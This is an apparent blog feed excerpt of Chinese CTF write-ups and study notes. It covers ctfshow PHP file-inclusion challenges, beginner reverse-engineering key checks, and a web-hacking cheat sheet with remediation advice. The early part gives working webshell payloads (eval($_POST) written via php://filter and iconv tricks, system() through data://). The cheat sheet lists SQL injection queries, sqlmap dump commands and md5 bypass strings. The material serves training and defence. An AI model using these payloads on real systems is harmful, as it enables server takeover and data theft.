<pre><code class="hljs plaintext">file=%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%33%25%37%34%25%37%32%25%36%39%25%36%65%25%36%37%25%32%65%25%37%32%25%36%66%25%37%34%25%33%31%25%33%33%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%33%32%25%32%65%25%37%30%25%36%38%25%37%30
//?file=php://filter/string.rot13/resource=2.php</code></pre>
<pre><code class="hljs plaintext">post
content=aaPD9waHAgZXZhbCgkX1BPU1RbSF0pOz8+    //&lt;?php eval($_POST[H]);?&gt;</code></pre>
<blockquote>
<p>content的值前面要加两个字符，因为base64算法解码时是4个byte一组，前面还剩phpdie 6个字符，所以给他增加2个字符 一共8个字符</p>
</blockquote>
<p>然后命令执行</p>
<pre><code class="hljs plaintext">H=system(&#x27;tac *&#x27;);</code></pre>
<h1 id="web88">web88</h1>
<pre><code class="hljs plaintext">&lt;?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-17 02:27:25
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

 */
if(isset($_GET[&#x27;file&#x27;]))&#123;
    $file = $_GET[&#x27;file&#x27;];
    if(preg_match(&quot;/php|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=|\./i&quot;, $file))&#123;  // 过滤了这些,但是没有过滤:
        die(&quot;error&quot;);
    &#125;
    include($file);
&#125;else&#123;
    highlight_file(__FILE__);
&#125;</code></pre>
<p>payload</p>
<pre><code class="hljs plaintext">?file=data://text/plain;base64, PD9waHAgc3lzdGVtKCdiYXNlNjQgZmwwZy5waHAnKTsgPz4</code></pre>
<p><img src="http://img.hzy2003628.top/202207131132452.png" alt="image-20220713113222348"></p>
<pre><code class="hljs plaintext">&lt;?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:24:37
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-16 11:25:00
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


$flag=&quot;ctfshow&#123;4dc213a5-7f9e-49bc-8d00-31104deb9091&#125;&quot;;</code></pre>
<h1 id="web116">web116</h1>
<p>进去之后就是一段视频,下载下来</p>
<p><img src="http://img.hzy2003628.top/202207131134829.png" alt="image-20220713113419642"></p>
<p>我省略了分离png的步骤,misc就不弄了,麻烦,总之就是把视频down下,然后用winhex分离出来一个图片</p>
<p>bp抓包文件包含,读源码<img src="http://img.hzy2003628.top/202207131138370.png" alt="image-20220713113849280"></p>
<pre><code class="hljs plaintext">&lt;?php
error_reporting(0);
function filter($x)&#123;
    if(preg_match(&#x27;/http|https|data|input|rot13|base64|string|log|sess/i&#x27;,$x))&#123;  // 过滤了这些
        die(&#x27;too young too simple sometimes naive!&#x27;);
    &#125;
&#125;
$file=isset($_GET[&#x27;file&#x27;])?$_GET[&#x27;file&#x27;]:&quot;5.mp4&quot;;
filter($file);
header(&#x27;Content-Type: video/mp4&#x27;);
header(&quot;Content-Length: $file&quot;);
readfile($file);
?&gt;</code></pre>
<p><img src="http://img.hzy2003628.top/202207131141836.png" alt="image-20220713114100730"></p>
<p>是可以正常读文件的,那我们直接包含flag吧</p>
<p><img src="http://img.hzy2003628.top/202207131146685.png" alt="image-20220713114600610"></p>
<h1 id="web117">web117</h1>
<pre><code class="hljs plaintext">&lt;?php

/*
# -*- coding: utf-8 -*-
# @Author: yu22x
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-10-01 18:16:59

*/
highlight_file(__FILE__);
error_reporting(0);
function filter($x)&#123;
    if(preg_match(&#x27;/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i&#x27;,$x))&#123;
        die(&#x27;too young too simple sometimes naive!&#x27;);
    &#125;
&#125;
$file=$_GET[&#x27;file&#x27;];
$contents=$_POST[&#x27;contents&#x27;];
filter($file);
file_put_contents($file, &quot;&lt;?php die();?&gt;&quot;.$contents);</code></pre>
<pre><code class="hljs plaintext">payload: file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.php 

post:contents=?&lt;hp pvela$(P_SO[T]1;)&gt;?</code></pre>
<p><img src="http://img.hzy2003628.top/202207131155218.png" alt="image-20220713115532139"></p>
<hr>
<h1 id="参考">参考:</h1>
<p><a href="https://rolemee.com/2021/07/24/ctfshow-web-ru-men-wen-jian-bao-han-87-88/#!">ctfshow-web入门-文件包含-87-88 | Rolemee的小破站</a></p>
<p><a href="https://wp.ctf.show/d/140-ctfshow-web-78-88">ctfshow web入门 78-88的文件包含 - CTFshow WP</a></p>
<p><a href="https://www.xl-bit.cn/index.php/archives/84/">CTFshow—WEB入门—（文件包含）78-88 ，116,117 WP - Bit’s Blog (xl-bit.cn)</a></p>
<p><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">谈一谈php://filter的妙用 | 离别歌 (leavesongs.com)</a></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>Web</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>ctfshow</tag>
        <tag>web</tag>
        <tag>wp</tag>
        <tag>文件包含</tag>
      </tags>
  </entry>
  <entry>
    <title>reverse认知</title>
    <url>/2022/01/20/ctf%E4%B9%8Breverse/</url>
    <content><![CDATA[<p>CTF中的Reverse领域的入门学习</p>
<span id="more"></span>
<h1 id="逆向">逆向</h1>
<p>​     不说题外话，经过一学期的学习和参加一次CTF大赛后，对于reverse的最直观的印象就是写脚本，写各种程序，不论是很简单的reverse题还是较为复杂的，甚至有时候思路很明确，写出来脚本之后flag就到手了。</p>
<p>​      总而言之，对于reverse，如果想学精学透，最基础的应该就是从脚本下手，多刷题，多写脚本，而对于解题方便，脚本语言习惯上使用python，所以学好python，非常重要，不仅仅是python，多掌握一门语言没有坏处，学习C语言也是必不可少的。</p>
<h1 id="逆向的核心">逆向的核心</h1>
<p>​      学习逆向不仅仅要学好语言，最重要的核心是破解验证算法，要学好算法！</p>
<h2 id="验证算法如下">验证算法如下</h2>
<p>输入：key</p>
<p>验证：if H(key)==Secret</p>
<pre><code class="hljs c">&#123;
    flag=O(key);
    print flag;
&#125;</code></pre>
<p>输出：flag</p>
<h2 id="验证算法分类">验证算法分类</h2>
<p>1.简单比较验证</p>
<p>2.密码算法验证</p>
<p>3.算法求解验证</p>
<h2 id="算法举例如下">算法举例如下：</h2>
<h3 id="1key直接比较">1.key直接比较</h3>
<pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;string.h&gt;</span></span>
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>
&#123;
   <span class="hljs-type">char</span> szKey[<span class="hljs-number">20</span>];
   <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;input Key:&quot;</span>);
   <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%16s&quot;</span>,szKey);
   <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strncmp</span>(szKey,<span class="hljs-string">&quot;Thi5_i5_TOo_E4sy&quot;</span>,<span class="hljs-number">16</span>)==<span class="hljs-number">0</span>)
   &#123;
      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;flag is your key!\n&quot;</span>);
   &#125;
   <span class="hljs-keyword">else</span>
   &#123;
      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;please decompiler or debug me!\n&quot;</span>);
   &#125;
   <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
&#125;</code></pre>
<p>这种类型flag就在其中，善于观察即可！</p>
<h3 id="2key简单变换">2.key简单变换</h3>
<pre><code class="hljs c"><span class="hljs-type">char</span> secret[]=<span class="hljs-string">&quot;\x58\x31\x70\x5C\x35\x76\x59\x69\x38\x7D\x55\x63\x38\x7F\x6A&quot;</span>;
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>
&#123;
   <span class="hljs-type">char</span> szKey[<span class="hljs-number">20</span>]=&#123;<span class="hljs-number">0</span>&#125;,szXor[<span class="hljs-number">20</span>]=&#123;<span class="hljs-number">0</span>&#125;;
   <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;
   <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;input Key:&quot;</span>);
   <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%16s&quot;</span>,szKey);
   <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;strien(szKey);i++)
   &#123;
      szXor[i]=szKey[i]^i;
   &#125;
   <span class="hljs-keyword">if</span>(<span class="hljs-built_in">memcmp</span>(szXor,secret,<span class="hljs-keyword">sizeof</span>(secret))==<span class="hljs-number">0</span>)
   &#123;
      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;xman&#123;%s&#125;\r\n&quot;</span>,szKey);
   &#125;
   <span class="hljs-keyword">else</span>
   &#123;
      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;please reverse me!\r\n&quot;</span>);
   &#125;
   <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
&#125;</code></pre>
<p>这个用异或，再进行一次就出来了，见识短浅的我表示还再学习学习才能明白。</p>
<h3 id="3key编码转换">3.key编码转换</h3>
<pre><code class="hljs c"><span class="hljs-type">char</span> secret[]=<span class="hljs-string">&quot;QjRzZTYOX2k1X2MwbW1vbg==&quot;</span>;
<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>
&#123;
   <span class="hljs-type">char</span> szKey[<span class="hljs-number">20</span>]=&#123;<span class="hljs-number">0</span>&#125;,szBase64[<span class="hljs-number">40</span>]=&#123;<span class="hljs-number">0</span>&#125;;
   <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;
   <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;input key:&quot;</span>);
   <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%16s&quot;</span>,szkey);
   Base64encode(szBase64,szKey,<span class="hljs-built_in">strlen</span>(szkey));
   <span class="hljs-keyword">if</span>(<span class="hljs-built_in">memcmp</span>(szBase64,secret,<span class="hljs-keyword">sizeof</span>(serect))==<span class="hljs-number">0</span>)
   &#123;
      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;xman&#123;%s&#125;\r\n&quot;</span>,szKey);
   &#125;
   <span class="hljs-keyword">else</span> 
   &#123;
      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;please reverse me!\r\n&quot;</span>);
   &#125;
   <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
&#125;</code></pre>
<p>这种转换常见为Base64，也不排除会出现其他编码！</p>
<h3 id="4key散列计算">4.key散列计算</h3>
<p>这种类型的，可以用md5进行反查</p>
<h2 id="验证算法逆向思路">验证算法逆向思路</h2>
<h3 id="简单变化验证">简单变化验证</h3>
<p>----人工逆向，找到可逆运算，按位分步破解</p>
<h3 id="密码算法验证">密码算法验证</h3>
<p>----识别密码算法，针对性解密</p>
<h3 id="解题算法验证">解题算法验证</h3>
<p>----理解算法原理，针对性解题</p>
<h3 id="验证常见漏洞">验证常见漏洞</h3>
<p>----直接输出flag</p>
<p>----密钥空间过短</p>
<p>----伪随机算法</p>
<h3 id="现实竞赛">现实竞赛</h3>
<p>----分段，嵌套验证</p>
<h3 id="爆破奇招">爆破奇招</h3>
<p>----简单验证（按位破解）</p>
<p>----密码算法（密钥部分已知）</p>
<p>----解题算法（暴力搜索）</p>
<h2 id="解题">解题</h2>
<p>要学会用F5做签到题，害，暂时就写到这吧，先学好就是多刷题，goodbye！！！</p>
<h1 id="练习平台">练习平台</h1>
<p>1.i春秋训练平台：<a href="https://www.ichunqiu.com/battalion">https://www.ichunqiu.com/battalion</a></p>
<p>2.We Chall:  <a href="http://www.wechall.net/sites.php">http://www.wechall.net/sites.php</a></p>
<p>3.很炫酷游戏化————<a href="https://microcorruption.com/login">https://microcorruption.com/login</a></p>
<p>4.<a href="https://adworld.xctf.org.cn/">攻防世界 (xctf.org.cn)</a></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>RE</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>RE</tag>
      </tags>
  </entry>
  <entry>
    <title>ctf之Web</title>
    <url>/2022/01/08/ctf%E4%B9%8Bweb/</url>
    <content><![CDATA[<p>CTF中的Web领域的入门学习</p>
<span id="more"></span>
<h1 id="ctftools">CTFtools</h1>
<p><a href="http://www.hiencode.com/">CTF在线工具-CTF工具|CTF编码|CTF密码学|CTF加解密|程序员工具|在线编解码 (hiencode.com)</a></p>
<p><a href="https://www.ctftools.com/down/">CTFtools</a>（各种web工具在这里都可以找到）</p>
<h1 id="ctf中web题的相关解题步骤">CTF中Web题的相关解题步骤</h1>
<p>大致都要走以下方法：</p>
<h2 id="1-看源码">1. 看源码</h2>
<p>右键-&gt;【查看网页源代码】，F12也可以，看网页的源代码，一些签到题或者比较简单的题型都可以直接通过看源代码得到flag，个别题也可以在源代码里得到相关提示。</p>
<h2 id="2-抓包">2. 抓包</h2>
<p>抓包也是做web常用的方法，而抓包最常用的一般是burpsuite，常用的是【send to Repeater】用于多次尝试，【send to Intruder】用于对某个字段进行爆破，这是比较常用的两种功能。</p>
<h2 id="3-经常关注的几个地方">3. 经常关注的几个地方</h2>
<p>多刷题后就会发现很多经常需要关注的地方，有时候打开网页后感觉没有可疑的地方，首先查看下源代码，看有没有注释之类的提示信息，之后重新打开网页，抓抓包看下请求包响应包的包头数据有没有可疑的地方。</p>
<h2 id="4-include漏洞">4. include漏洞</h2>
<p>遇到php代码中有include($file)的，一般和 php://input或者php://filter有关，$file值如果是php://input，就要用post表单构造数据，如果是php://filter，就用下面的payload读取文件base64加密后的源代码，解密后查看源代码。</p>
<pre><code class="hljs plaintext">PHP://filter/read=convert.base64-encode/resource=文件名(如index.php)</code></pre>
<h2 id="5-代码审计">5. 代码审计</h2>
<p>需要多次动态调试来尝试，以及要关注里面出现的函数，出现在关键位置的函数一般都是有用的，搜索一下有没有相关的漏洞。</p>
<p>还有一些和数据处理有关的绕过，如md5函数结果相等（0ed+）的比较，以及strcmp(array,string)=null，除了遇到时多百度之外，平时也需要多积累到时候才能想到。</p>
<p>还有GET参数构造的时候如果传入的是数组要记得加[]，？txt[]=[1,2,3]，如果填?txt=[1,2,3]似乎不会被当做array处理。</p>
<h2 id="6编码">6.编码</h2>
<p>JS的几种编码（如JSFUCK）都可以在浏览器F12之后的控制台执行，这样可以省去找解密网站的时间。</p>
<p>html编码，base64编码，url编码等等都可以在burpsuite上的decoder栏解决，但是发现burpsuite有一点不好就是中文不能显示，不知道是不是字符编码没有配置好，找到一个网址：</p>
<p><a href="https://emn178.github.io/online-tools/base64_decode.html">https://emn178.github.io/online-tools/base64_decode.html</a></p>
<p>可以解好多种加密，界面也很简洁。</p>
<h2 id="7sql注入">7.SQL注入</h2>
<pre><code class="hljs plaintext">
a&gt;对一个注入语句记个笔记：
 
%df&#x27; union select 1,database() %23 %df&#x27; union select 1,string from sql5.key %23
 
%df是在编码为gbk的时候用于宽字节注入的；%23就是#，但是用#不能通过；还有可以直接用 union select 字段名 from 数据库名.表名 的方式获取字段的值。
 
b&gt;对用sqlmap进行手工注入的一些步骤记个笔记首先找到可以注入的点，比如找到网页的某个动态页面是可以注入用来显示信息的，然后将这个url用sqlmap来暴库爆表。
 
python sqlmap.py -u &quot;url&quot; --level 3 --batch --dbs python sqlmap.py -u &quot;url&quot; --level 3 --batch -D ctf --tables python sqlmap.py -u &quot;url&quot; --level 3 --batch -D ctf -T flag --columns --dump
 
–batch sqlmap不会询问你输入 全部默认确定
 
–level 3 指定等级，大于等于3的时候会涉及到http头注入的Referer字段
 
–（两个-）符号用于查询，比如–dbs用于查询所有的数据库，–tables用于查询所有的表，-（一个-）符号用于指定，比如-D ctf用于指定查询的是ctf数据库，-T flag用于指定查询的是flag表，–dump可以用来将表中字段的值显示出来。
 
c&gt;还有一些用union select来获得数据库信息的，链接
 
http://www.2cto.com/article/201208/151503.html
 
讲得很全面。
</code></pre>
<pre><code class="hljs plaintext">
1. @@version() MYSQL版本 
2. @@database() 当前数据库 
3. @@user() 当前用户 
4. @@datadir 当前数据库路径 
5. @@version_compile_os 操作系统版本
 
1. concat(str1,str2,...) 没有分隔符地连接字符串 
2. concat_ws(separator,str1,str2,...) 用分隔符连接字符串 
3. group_concat(str1,str2,...) 用逗号分隔字符串
 
1. 查数据库名，用户名 
union select 1,2,concat(user(),database(),version()),4,……,N -- 
（最后--用于注释掉后面sql语句避免出错）得到数据库名 
2. 查表名： union select group_concat(0x0a,table_name),2
 from information_schema.tables 
where table_schema=库名十六进制# 
（库名十六进制可以用database()代替） 
3. 查列名 union select group_concat(0x0a,column_name)
,2 from information_schema.columns 
where table_schema=database() and table_name=’users’# （
也可以把表名改为十六进制编码0x7573657273） 
4. 查需要的信息（用户名和密码） 
union select group_concat(distinct 0x0a,user_id,0x0a,first_name,0x0a,
last_name,0x0a,user,0x0a,password,0x0a),
2 from users #
 
总结的都比较散碎也比较基础，以后积累的多了一些之后再来继续补充。

</code></pre>
<p>&lt; 用这个表示\u003c   &gt;用这个表示 \u003e</p>
<p>[^]:</p>
<p>序列化学习网址</p>
<p><a href="https://www.cnblogs.com/youyoui/p/8610068.html">https://www.cnblogs.com/youyoui/p/8610068.html</a></p>
<pre><code class="hljs plaintext">1、当在一个网页上找不到任何信息时，要查看他有没有robots.txt 或者前面的备份文件
 
2、extract() 函数从数组中将变量导入到当前的符号表。通俗的讲 就是可以将键变成变量名，键值可以变成变量名的值
 
sha1（）和md5（）都可以用数组绕过 而md5加密后判断相等时只要是0e字符串都会返回true
 
QNKCDZO 0e830400451993494058024219903391 s878926199a 0e545993274517709034328855841020 s155964671a 0e342768416822451524974117254469 s214587387a 0e848240448830537924465865611904
 
 
 
3、file_get_contents（） 可以使用php://input传过去 再用post构建其里面的内容
 
include() 可以使用
 
PHP://filter/read=convert.base64-encode/resource=文件名(如index.php) 也可以使用上述的方法。</code></pre>
<p>sql md5</p>
<p>看到这里的提交参数被MD5再组合进SQL查询语句，导致常规的注入手段几乎都失效了</p>
<p>但是注意到，MD5之后是hex格式，转化到字符串时如果出现’or’xxxx的形式，就会导致注入</p>
<p>这里提供一个字符串：ffifdyop</p>
<p>md5(ffifdyop,32) = 276f722736c95d99e921722cf9ed621c</p>
<p>转成字符串为’or’6�]��!r,��b</p>
<p>从而完成了注入</p>
<h1 id="web常见漏洞描述及修复建议">Web常见漏洞描述及修复建议</h1>
<h2 id="1sql注入">1.<a href="https://so.csdn.net/so/search?q=SQL%E6%B3%A8%E5%85%A5&amp;spm=1001.2101.3001.7020">SQL注入</a></h2>
<p><strong>漏洞描述</strong></p>
<p>Web程序中对于用户提交的参数未做过滤直接拼接到<a href="https://so.csdn.net/so/search?q=SQL%E8%AF%AD%E5%8F%A5&amp;spm=1001.2101.3001.7020">SQL语句</a>中执行，导致参数中的特殊字符破坏了SQL语句原有逻辑，攻击者可以利用该漏洞执行任意SQL语句，如查询数据、下载数据、写入webshell、执行系统命令以及绕过登录限制等。</p>
<p><strong>修复建议</strong></p>
<p>代码层最佳防御sql漏洞方案：使用预编译sql语句查询和绑定变量。</p>
<p>（1）使用预编译语句，使用PDO需要注意不要将变量直接拼接到PDO语句中。所有的查询语句都使用数据库提供的参数化查询接口，参数化的语句使用参数而不是将用户输入变量嵌入到SQL语句中。当前几乎所有的数据库系统都提供了参数化SQL语句执行接口，使用此接口可以非常有效的防止SQL注入攻击。</p>
<p>（2）对进入数据库的特殊字符（’”&lt;&gt;&amp;*;等）进行转义处理，或编码转换。</p>
<p>（3）确认每种数据的类型，比如数字型的数据就必须是数字，数据库中的存储字段必须对应为int型。</p>
<p>（4）数据长度应该严格规定，能在一定程度上防止比较长的SQL注入语句无法正确执行。</p>
<p>（5）网站每个数据层的编码统一，建议全部使用UTF-8编码，上下层编码不一致有可能导致一些过滤模型被绕过。</p>
<p>（6）严格限制网站用户的数据库的操作权限，给此用户提供仅仅能够满足其工作的权限，从而最大限度的减少注入攻击对数据库的危害。</p>
<p>（7）避免网站显示SQL错误信息，比如类型错误、字段不匹配等，防止攻击者利用这些错误信息进行一些判断。</p>
<p>（8）过滤危险字符，例如：采用正则表达式匹配union、sleep、and、select、load_file等关键字，如果匹配到则终止运行。</p>
<h2 id="2xss">2.XSS</h2>
<p><strong>漏洞描述</strong></p>
<p>1、Web程序代码中对用户提交的参数未做过滤或过滤不严，导致参数中的特殊字符破坏了HTML页面的原有逻辑，攻击者可以利用该漏洞执行恶意HTML/JS代码、构造蠕虫、篡改页面实施钓鱼攻击、以及诱导用户再次登录，然后获取其登录凭证等。</p>
<p>2、XSS攻击对Web服务器本身虽无直接危害，但是它借助网站进行传播，对网站用户进行攻击，窃取网站用户账号身份信息等，从而也会对网站产生较严重的威胁。</p>
<p>XSS攻击可导致以下危害：</p>
<p>1、钓鱼欺骗：最典型的就是利用目标网站的反射型跨站脚本漏洞将目标网站重定向到钓鱼网站，或者通过注入钓鱼JavaScript脚本以监控目标网站的表单输入，甚至攻击者基于DHTML技术发起更高级的钓鱼攻击。</p>
<p>2、网站挂马：跨站时，攻击者利用Iframe标签嵌入隐藏的恶意网站，将被攻击者定向到恶意网站上、或弹出恶意网站窗口等方式，进行挂马。</p>
<p>3、身份盗用：Cookie是用户对于特定网站的身份验证标志，XSS攻击可以盗取用户的cookie，从而利用该cookie盗取用户对该网站的操作权限。</p>
<p>4、盗取网站用户信息：当窃取到用户cookie从而获取到用户身份时，攻击者可以盗取到用户对网站的操作权限，从而查看用户隐私信息。</p>
<p>5、垃圾信息发送：在社交网站社区中，利用XSS漏洞借用被攻击者的身份发送大量的垃圾信息给特定的目标群。</p>
<p>6、劫持用户Web行为：一些高级的XSS攻击甚至可以劫持用户的Web行为，从而监视用户的浏览历史、发送与接收的数据等等。</p>
<p>7、XSS蠕虫：借助XSS蠕虫病毒还可以用来打广告、刷流量、挂马、恶作剧、破坏数据、实施DDoS攻击等。</p>
<p><strong>修复建议</strong></p>
<p>xss漏洞本质上是一种html注入，也就是将html代码注入到网页中。那么其防御的根本就是在将用户提交的代码显示到页面上时做好一系列的过滤与转义</p>
<p>（1）过滤输入的数据，对例如：“ ‘ ”，“ “ ”，” &lt; “，” &gt; “，” on* “，script、iframe等危险字符进行严格的检查。这里的输入不仅仅是用户可以直接交互的输入接口，也包括HTTP请求中的Cookie中的变量，HTTP请求头部中的变量等。</p>
<p>（2）不仅验证数据的类型，还要验证其格式、长度、范围和内容。</p>
<p>（3）不仅在客户端做数据的验证与过滤，关键的过滤步骤在服务端进行。</p>
<p>（4）对输出到页面的数据进行相应的编码转换，如HTML实体编码、JS编码等。对输出的数据也要检查，数据库里的值有可能会在一个大网站的多处都有输出，即使在输入做了编码等操作，在各处的输出点时也要进行检查。</p>
<h2 id="3xxe">3.XXE</h2>
<p><strong>漏洞详情</strong></p>
<p>参考：<a href="https://www.freebuf.com/company-information/165769.html">https://www.freebuf.com/company-information/165769.html</a></p>
<h2 id="4csrf">4.CSRF</h2>
<p><strong>漏洞描述</strong>**：**</p>
<p>CSRF是跨站请求伪造，不攻击网站服务器，而是冒充用户在站内的正常操作。通常由于服务端没有对请求头做严格过滤引起的。CSRF会造成密码重置，用户伪造等问题，可能引发严重后果。绝大多数网站是通过 cookie 等方式辨识用户身份，再予以授权的。所以要伪造用户的正常操作，最好的方法是通过 XSS 或链接欺骗等途径，让用户在本机（即拥有身份 cookie 的浏览器端）发起用户所不知道的请求。CSRF攻击会令用户在不知情的情况下攻击自己已经登录的系统。</p>
<p><strong>修复建议</strong></p>
<p>1、验证请求的Referer是否来自本网站，但可被绕过。</p>
<p>2、在请求中加入不可伪造的token，并在服务端验证token是否一致或正确，不正确则丢弃拒绝服务。</p>
<h2 id="5ssrf">5.SSRF</h2>
<p><strong>漏洞描述</strong></p>
<p>SSRF（Server-Side Request Forgery，服务器端请求伪造）：通俗的来说就是我们可以伪造服务器端发起的请求，从而获取客户端所不能得到的数据。SSRF漏洞形成的原因主要是服务器端所提供的接口中包含了所要请求的内容的URL参数，并且未对客户端所传输过来的URL参数进行过滤。这个漏洞造成的危害有：</p>
<p>(1)、可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息;</p>
<p>(2)、攻击运行在内网或本地的应用程序（比如溢出）;</p>
<p>(3)、对内网Web应用进行指纹识别，通过访问默认文件实现;</p>
<p>(4)、攻击内外网的Web应用，主要是使用Get参数就可以实现的攻击（比如Struts2漏洞利用，SQL注入等）;</p>
<p>(5)、利用File协议读取本地文件。</p>
<p><strong>修复建议</strong></p>
<p>1、禁用不需要的协议，只允许HTTP和HTTPS请求，可以防止类似于file://, gopher://, ftp:// 等引起的问题。</p>
<p>2、白名单的方式限制访问的目标地址，禁止对内网发起请求</p>
<p>3、过滤或屏蔽请求返回的详细信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。</p>
<p>4、验证请求的文件格式</p>
<p>5、禁止跳转</p>
<p>6、限制请求的端口为http常用的端口，比如 80、443、8080、8000等</p>
<p>7、统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。</p>
<h2 id="6任意命令代码执行">6.任意命令/代码执行</h2>
<p><strong>漏洞描述</strong></p>
<p>命令或代码执行漏洞是指代码未对用户可控参数做过滤，导致直接带入执行命令和代码，通过漏洞执行恶意构造的语句，执行任意命令或代码。攻击者可在服务器上执行任意命令，读写文件操作等，危害巨大。</p>
<p><strong>修复建议</strong></p>
<p>1、严格过滤用户输入的数据，禁止执行非预期系统命令。</p>
<p>2、减少或不使用代码或命令执行函数</p>
<p>3、客户端提交的变量在放入函数前进行检测</p>
<p>4、减少或不使用危险函数</p>
<h2 id="7任意文件上传">7.任意文件上传</h2>
<p><strong>漏洞描述</strong></p>
<p>文件上传漏洞通常由于代码中对文件上传功能所上传的文件过滤不严或web服务器相关解析漏洞未修复而造成的，如果文件上传功能代码没有严格限制和验证用户上传的文件后缀、类型等，攻击者可通过文件上传点上传任意文件，包括网站后门文件（webshell）控制整个网站。</p>
<p><strong>修复建议</strong></p>
<p>1、对上传文件类型进行验证，除在前端验证外在后端依然要做验证，后端可以进行扩展名检测，重命名文件，MIME类型检测以及限制上传文件的大小等限制来防御，或是将上传的文件其他文件存储服务器中。</p>
<p>2、严格限制和校验上传的文件，禁止上传恶意代码的文件。同时限制相关上传文件目录的执行权限，防止木马执行。</p>
<p>3、对上传文件格式进行严格校验，防止上传恶意脚本文件；</p>
<p>4、严格限制上传的文件路径。</p>
<p>5、文件扩展名服务端白名单校验。</p>
<p>6、文件内容服务端校验。</p>
<p>7、上传文件重命名。</p>
<p>8、隐藏上传文件路径。</p>
<h2 id="8目录穿越目录遍历">8.目录穿越/目录遍历</h2>
<p><strong>漏洞描述</strong></p>
<p>文件下载或获取文件显示内容页面由于未对传入的文件名进行过滤，利用路径回溯符…/跳出程序本身的限制目录，来下载或显示任意文件。</p>
<p><strong>修复建议</strong></p>
<p>对传入的文件名参数进行过滤，并且判断是否是允许获取的文件类型，过滤回溯符…/。</p>
<h2 id="9文件包含">9.文件包含</h2>
<p><strong>漏洞描述</strong></p>
<p>本地文件包含是指程序在处理包含文件的时候没有严格控制。利用这个漏洞，攻击者可以先把上传的文件、网站日志文件等作为代码执行或直接显示出来，或者包含远程服务器上的恶意文件，进而获取到服务器权限。</p>
<p><strong>修复建议</strong></p>
<p>1、严格检查变量是否已经初始化。</p>
<p>2、对所有输入提交可能包含的文件地址，包括服务器本地文件及远程文件，进行严格的检查，参数中不允许出现./和…/等目录跳转符。</p>
<p>3、严格检查文件包含函数中的参数是否外界可控。</p>
<h2 id="10弱口令">10.弱口令</h2>
<p><strong>漏洞描述</strong></p>
<p>由于网站用户帐号存在弱口令，导致攻击者通过弱口令可轻松登录到网站中，从而进行下一步的攻击，如上传webshell，获取敏感数据。</p>
<p>另外攻击者利用弱口令登录网站管理后台，可执行任意管理员的操作。</p>
<p><strong>修复建议</strong></p>
<p>1、强制用户首次登录时修改默认口令，或是使用用户自定义初始密码的策略；</p>
<p>2、完善密码策略，信息安全最佳实践的密码策略为8位（包括）以上字符，包含数字、大小写字母、特殊字符中的至少3种。</p>
<p>3、增加人机验证机制，限制ip访问次数。</p>
<h2 id="11暴力破解">11.暴力破解</h2>
<p><strong>漏洞描述</strong></p>
<p>由于没有对登录页面进行相关的人机验证机制，如无验证码、有验证码但可重复利用以及无登录错误次数限制等，导致攻击者可通过暴力破解获取用户登录账号和密码。</p>
<p><strong>修复建议</strong></p>
<p>1、如果用户登录次数超过设置的阈值，则锁定帐号(有恶意登录锁定帐号的风险)</p>
<p>2、如果某个 IP登录次数超过设置的阈值，则锁定IP</p>
<p>3、增加人机验证机制</p>
<p>4、验证码必须在服务器端进行校验，客户端的一切校验都是不安全的。</p>
<h2 id="12越权访问">12.越权访问</h2>
<p><strong>漏洞描述</strong></p>
<p>由于没有对用户访问角色的权限进行严格的检查及限制，导致当前账号可对其他账号进行相关操作，如查看、修改等。对低权限对高权限账户的操作为纵向越权，相同权限账户之间的操作成为横向越权也称水平越权。</p>
<p><strong>修复建议</strong></p>
<p>1、对用户访问角色的权限进行严格的检查及限制。</p>
